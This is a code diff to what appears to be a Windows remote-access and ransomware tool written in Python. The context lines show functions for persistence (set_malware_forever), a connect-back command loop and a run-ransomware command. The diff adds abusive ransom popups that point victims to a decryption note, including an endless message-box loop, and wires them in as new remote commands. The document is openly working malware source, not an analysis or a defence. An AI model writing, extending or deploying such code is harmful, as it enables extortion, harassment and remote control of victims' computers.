@@ -43,6 +43,30 @@ banner = r"""
       - Clear console.
 =====================================================
 """
+def scream(popup=f"""
+    ╔══════════════════════════════════════════════════════════╗
+    ║            YOU'VE BEEN HACKED ASSHOLE!                   ║
+    ║              WE'RE NOW IN YOUR WORLD                     ║
+    ║                                                          ║     
+    ║  Check READ_ME_FOR_DECRYPTION.txt for details            ║
+    ║  Don't even think about restoring your device asshole    ║
+    ║                                                          ║
+    ╚══════════════════════════════════════════════════════════╝
+"""):
+    while True:
+       sleep(2)
+       ctypes.windll.user32.MessageBoxW(0, popup, "YOU HAVE BEEN HACKED BITCH", 0x40 | 0x1)
+def open_popup(popup=f"""
+    ╔══════════════════════════════════════════════════════════╗
+    ║            YOU'VE BEEN HACKED ASSHOLE!                   ║
+    ║              WE'RE NOW IN YOUR WORLD                     ║
+    ║                                                          ║     
+    ║  Check READ_ME_FOR_DECRYPTION.txt for details            ║
+    ║  Don't even think about restoring your device asshole    ║
+    ║                                                          ║
+    ╚══════════════════════════════════════════════════════════╝
+"""):
+    ctypes.windll.user32.MessageBoxW(0, popup, "YOU HAVE BEEN HACKED BITCH", 0x40 | 0x1)
 def set_malware_forever():
     file_name="win_service.exe"
     if hasattr(sys, "_MEIPASS"):
@@ -336,6 +360,16 @@ def connect_back():
             if cmd.lower().startswith("put_files_in_dir"):
                 args = cmd.split(' ')
                 put_files_in_dir(args)
+                continue
+            if cmd.lower().startswith('popup'):
+                args = cmd.split(' ')
+                if len(args) > 1:
+                    open_popup(args[1])
+                else:
+                    open_popup()
+                continue
+            if cmd.lower() == 'scream':
+                scream()
                 continue
             if cmd.lower() == "run-ransomware":
                 run_ransomware()
